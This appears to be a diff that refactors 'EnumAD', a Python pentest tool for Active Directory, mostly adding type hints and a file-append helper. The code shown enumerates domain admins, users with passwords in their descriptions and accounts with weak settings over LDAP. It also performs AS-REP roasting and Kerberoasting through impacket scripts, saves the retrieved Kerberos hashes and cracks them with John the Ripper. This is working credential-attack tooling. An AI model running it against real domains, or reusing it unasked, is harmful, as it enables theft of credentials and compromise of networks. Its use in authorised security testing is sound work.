@@ -1,3 +1,4 @@
+ from logging import error
 import ldap
 from ldap import VERSION3 
 from pwn import log 
@@ -19,24 +20,24 @@ class bcolors:
     FAIL = '\033[91m'
     ENDC = '\033[0m'
     BOLD = '\033[1m'
-def highlightGreen(msg):
+def highlightGreen(msg:str)->str:
     return bcolors.OKGREEN + msg + bcolors.ENDC
-def highlightRed(msg):
+def highlightRed(msg:str)->str:
     return bcolors.FAIL + msg + bcolors.ENDC
-def StyleBold(msg):
+def StyleBold(msg:str)->str:
     return bcolors.BOLD + msg + bcolors.ENDC
 
-def LdapPathColor(data):
+def LdapPathColor(data:str)->str:
     strColor = data.replace("CN=", StyleBold("CN") +"=").replace("OU=", StyleBold("OU")+"=").replace("DC=", StyleBold("DC")+"=")
     return strColor
 
-def printTitle(msg):
+def printTitle(msg:str)->None:
     print("\n" + bcolors.BOLD + msg + bcolors.ENDC)
 
-def CreateSpace(varString,nbSpace = 25):
+def CreateSpace(varString:str,nbSpace = 25)->str:
     return (nbSpace - int(math.fmod(len(varString),nbSpace))) * ' '
 
-def ResovelIpAddress(ServerName):
+def ResovelIpAddress(ServerName:str)->str:
     try:
         data = socket.gethostbyname_ex(ServerName)
         ipAddres = data[2][0]
@@ -45,17 +46,29 @@ def ResovelIpAddress(ServerName):
         return None
     return ipAddres
 
+def append_to_file(filename:str,date:str) -> bool:
+    try:
+        with open(filename, "a+") as file:
+            file.write(date + "\n")
+    except PermissionError as ErrorMsg:
+        log.failure("Fail to append to file: "+str(ErrorMsg)+" !\n")
+        return False
+    except:
+        log.failure("Fail to append to file: '"+filename+ "' !\n")
+        return False
+    return True
+
 class LdapEnum:
-    def __init__(self, BASE_DN):
+    def __init__(self, BASE_DN:str)->None:
         self.baseDn = BASE_DN
         self.ldapVerson = VERSION3
 
-    def __BannerLDAP(self):
+    def __BannerLDAP(self)->None:
         print("\n====================================================")
         print("===================== Enum LDAP ====================")
         print("====================================================\n\n")
         
-    def __SearchServerLdap(self,OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH):
+    def __SearchServerLdap(self,OBJECT_TO_SEARCH:str, ATTRIBUTES_TO_SEARCH:str)->list:
         resultSearch = []
 
         try:
@@ -75,13 +88,13 @@ class LdapEnum:
         return resultSearch
 
     # Unix timestamp to the AD one
-    def __datetime_to_mstimestamp(self, dt):
+    def __datetime_to_mstimestamp(self, dt:datetime)->int:
         timestamp = int(dt.timestamp())
         magic_number = 116_444_736_000_000_000
         shift = 10_000_000
         return (timestamp*shift) + magic_number
 
-    def SearchServerLdapUser(self,OBJECT_TO_SEARCH):
+    def SearchServerLdapUser(self,OBJECT_TO_SEARCH:str)->list:
         ATTRIBUTES_TO_SEARCH = ['sAMAccountName']
         resultSearch = []
 
@@ -103,7 +116,7 @@ class LdapEnum:
             exit(0)
         return resultSearch
         
-    def ConnectServerLdap(self,ServerName,ipAddress, username, password, isSSL):
+    def ConnectServerLdap(self,ServerName:str,ipAddress:str, username:str, password:str, isSSL:bool)->None:
         log.info("Domain name: "+ServerName)
         if(username == None):
             log.info("Username:    "+StyleBold("Anonymous"))
@@ -128,7 +141,7 @@ class LdapEnum:
         connect.protocol_version = self.ldapVerson
         try:
             if(username == None and password == None):
-                connect.simple_bind_s(username, password)
+                connect.simple_bind_s('', '')
             else:
                 if(password == None):
                     password == ''
@@ -150,7 +163,7 @@ class LdapEnum:
         self.ldapCon = connect
         return
 
-    def UserOldPassword(self):
+    def UserOldPassword(self)->None:
         printTitle("[-] Users with old password")
 
         passwordMinAge=100
@@ -169,7 +182,7 @@ class LdapEnum:
                 if(lastChange.days > 100):
                     log.warning("Username: "+ highlightRed(username)+CreateSpace(username)+"Password last change: " + highlightRed(str((now - value).days))+" days ago "+ value.strftime('%Y-%m-%d %H:%M:%S'))
    
-    def GetUserAndDesciption(self):
+    def GetUserAndDesciption(self)->None:
         printTitle("[-] Users with an interesting description")
 
         OBJECT_TO_SEARCH = '(&(objectCategory=user)(|(description=*pwd*)(description=*password*)))'
@@ -181,7 +194,7 @@ class LdapEnum:
             description = info[1]['description'][0].decode()
             log.info("Username: "+highlightRed(username)+CreateSpace(username)+description)
 
-    def GetDomainAdmin(self):
+    def GetDomainAdmin(self)->None:
         printTitle("[-] Users who are Domain Admin")
 
         OBJECT_TO_SEARCH = '(&(objectCategory=user)(adminCount=1))'
@@ -192,7 +205,7 @@ class LdapEnum:
             username = info[1]
             log.info("Username: "+highlightRed(username)+CreateSpace(username)+LdapPathColor(baseName))
 
-    def GetDomainControllers(self):
+    def GetDomainControllers(self)->None:
         printTitle("[-] Domain Controllers")
 
         OBJECT_TO_SEARCH = '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
@@ -207,7 +220,7 @@ class LdapEnum:
             log.info("Computer: "+highlightRed(ComputerName)+CreateSpace(ComputerName)+LdapPathColor(baseName))
             print("\t[V]",ComputerOsName, ComputerOsVersion)
 
-    def PasswordNotExpire(self):
+    def PasswordNotExpire(self)->None:
         printTitle("[-] Users with Password Not Expire")
 
         OBJECT_TO_SEARCH = '(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))'
@@ -218,7 +231,7 @@ class LdapEnum:
             username = info[1]
             log.info("Username: "+highlightRed(username)+CreateSpace(username)+LdapPathColor(baseName))
 
-    def UserDefEncrypt(self):
+    def UserDefEncrypt(self)->None:
         printTitle("[-] Users with not the default encryption")
 
         OBJECT_TO_SEARCH = '(&(objectCategory=person)(objectClass=user)(msDS-SupportedEncryptionTypes=*))'
@@ -245,7 +258,7 @@ class LdapEnum:
             log.info("Username: "+highlightRed(username)+CreateSpace(username)+algoType)
         return
         
-    def UserNoDelegation(self):
+    def UserNoDelegation(self)->None:
         printTitle("[-] Protecting Privileged Domain Accounts")
 
         OBJECT_TO_SEARCH = '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=1048576))'
@@ -256,11 +269,10 @@ class LdapEnum:
             username = info[1]
             log.info("Username: " + highlightRed(username) + CreateSpace(username) +LdapPathColor(baseName))
             
-   
-    def deconnect(self):
+    def deconnect(self)->None:
         self.ldapCon.unbind() 
 
-    def StartEnum(self):
+    def StartEnum(self)->None:
         self.__BannerLDAP()
 
         self.GetDomainAdmin()
@@ -273,26 +285,26 @@ class LdapEnum:
 
 class KerbExploit:
     
-    def __init__(self,ldapEnum, domainName,johnPath,wordlistPath,ipAddress=None):
+    def __init__(self,ldapEnum, domainName,johnPath,wordlistPath,ipAddress=None)->None:
         self.ldapEnum = ldapEnum
         self.domainName = domainName
         self.wordlistPath = wordlistPath
         self.ipAddress = ipAddress
         self.johnPath = johnPath
     
-    def __BannerAttack(self):
+    def __BannerAttack(self)->None:
         print("\n\n====================================================")
         print("==================== Attack AD =====================")
         print("====================================================\n")
 
-    def __RunImpacket(self,argProcess):
+    def __RunImpacket(self,argProcess:list)->list:
         if(self.ipAddress != None):
             argProcess.append("-dc-ip")
             argProcess.append(self.ipAddress)
         process =  subprocess.run(argProcess, check=True, stdout=subprocess.PIPE)
         return process.stdout.decode().splitlines()
 
-    def RunJohn(self,filenName, algoType):
+    def RunJohn(self,filenName:str, algoType:str)-> bool:
         isSuccess = False
         progress = log.progress("Cracking hash from file: " + highlightRed(filenName))
         process =  subprocess.run((self.johnPath, filenName,algoType, "--wordlist=" + self.wordlistPath), check=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL) 
@@ -320,20 +332,17 @@ class KerbExploit:
                     log.warning('Fail get hash !')
         progress.success(status='Done')
         return isSuccess
-    def __ExploitASREP(self, username, outputFile):
+    def __ExploitASREP(self, username:str, outputFile:str)-> bool:
         isSuccess = False
         argProcess = ["GetNPUsers.py",self.domainName+"/"+username,"-no-pass"]
         output = self.__RunImpacket(argProcess)
         for line in output:
             kerbHash = line.split('$')
             if(len(kerbHash) > 1 and kerbHash[1] == "krb5asrep" and kerbHash[2] == "23"): 
-                f = open(outputFile, "a+")
-                f.write(line + "\n")
-                f.close()
-                
-                isSuccess = True
+                if(append_to_file(outputFile,line)):
+                    isSuccess = True
         return isSuccess
-    def __ExploitKerberoasting(self, targetUser, username, password, TargetService, outputFile):
+    def __ExploitKerberoasting(self, targetUser:str, username:str, password:str, TargetService:str, outputFile:str) -> bool:
         isSuccess = False
         if(username == None or password == None):
             argProcess = ["GetUserSPNs.py",self.domainName+"/","-request-user",TargetService,"-no-pass"]
@@ -343,13 +352,11 @@ class KerbExploit:
         for line in output:
             kerbHash = line.split('$')
             if(len(kerbHash) > 1 and kerbHash[1] == "krb5tgs" and kerbHash[2] == "23"):
-                f = open(outputFile, "a+")
-                f.write(line + "\n")
-                f.close()
-                isSuccess = True
+                if(append_to_file(outputFile,line)):
+                    isSuccess = True
         return isSuccess
 
-    def ASREP_Roastable(self, outputFile = "ASREPHash.hash"):
+    def ASREP_Roastable(self, outputFile = "ASREPHash.hash")-> bool:
         printTitle("[-] AS-REP Roastable Users")
 
         isSuccess = False
@@ -364,7 +371,7 @@ class KerbExploit:
         if(isSuccess):
             log.success("Hash added to file:                " + outputFile)
         return isSuccess
-    def Kerberoastable(self,username, password, outputFile = "kerbHash.hash"):
+    def Kerberoastable(self,username:str, password:str, outputFile = "kerbHash.hash") -> dict:
         printTitle("[-] Kerberoastable Users")
 
         isSuccess = False
@@ -380,14 +387,14 @@ class KerbExploit:
         if(isSuccess):
             log.success("Hash added to file:                " + outputFile)
         return isSuccess
-    def DefaultConfig(self, ouputFile, formatHash):
+    def DefaultConfig(self, ouputFile:str, formatHash:str) -> dict:
         configDefault = {
             'ouputFile' : ouputFile,
             'formatHash' : formatHash,
             'isHashFound' : False
         }
         return configDefault
-    def StartKerbExploit(self,userConfig):
+    def StartKerbExploit(self,userConfig: dict) -> None:
         self.__BannerAttack()
 
         configASREP = self.DefaultConfig('ASREPHash.hash','--format=krb5asrep')
@@ -398,12 +405,12 @@ class KerbExploit:
 
         if((configASREP['isHashFound'] or configFileKerb['isHashFound']) and userConfig['baseDN']):
             printTitle("[-] Starting to crack hashs")
-            if(configASREP['isHashFound']):
+            if(configASREP['isHashFound'] and userConfig['isCrackingEnable']):
                 self.RunJohn(configASREP['ouputFile'], configASREP['formatHash'])
-            if(configFileKerb['isHashFound']):
+            if(configFileKerb['isHashFound'] and userConfig['isCrackingEnable']):
                 self.RunJohn(configFileKerb['ouputFile'], configFileKerb['formatHash'])
 
-def ManageArg():
+def ManageArg() -> dict:
     parser = argparse.ArgumentParser(description='Pentest tool that detect misconfig in AD with LDAP', usage='%(prog)s -d [domain] -u [username] -p [password]')
     parser.version = 'EnumAD version: 0.1.1-Dev'
 
@@ -445,7 +452,7 @@ def ManageArg():
     }
     return userConfig
 
-def CheckRequierment(userConfig):
+def CheckRequierment(userConfig: dict)-> None:
     if(userConfig['isCrackingEnable']):
         if(not path.exists(userConfig['wordlistPath'])):
             log.warning("Wordlist '"+userConfig['wordlistPath']+"' not found !")
@@ -460,7 +467,7 @@ def CheckRequierment(userConfig):
         log.info("Link: https://github.com/SecureAuthCorp/impacket")
 
 
-def MainBanner():
+def MainBanner() -> None:
     print("\n   █████╗ ██████╗     ███████╗███╗   ██╗██╗   ██╗███╗   ███╗")
     print("  ██╔══██╗██╔══██╗    ██╔════╝████╗  ██║██║   ██║████╗ ████║")
     print("  ███████║██║  ██║    █████╗  ██╔██╗ ██║██║   ██║██╔████╔██║")
@@ -469,7 +476,7 @@ def MainBanner():
     print("  ╚═╝  ╚═╝╚═════╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝")
     print("\n")
 
-def mainWork(userConfig):
+def mainWork(userConfig)-> None:
     ldapEnum = LdapEnum(userConfig['baseDN'])
     ldapEnum.ConnectServerLdap(userConfig['domain'], userConfig['ipAddress'],userConfig['username'], userConfig['password'], userConfig['isSSL'])
 
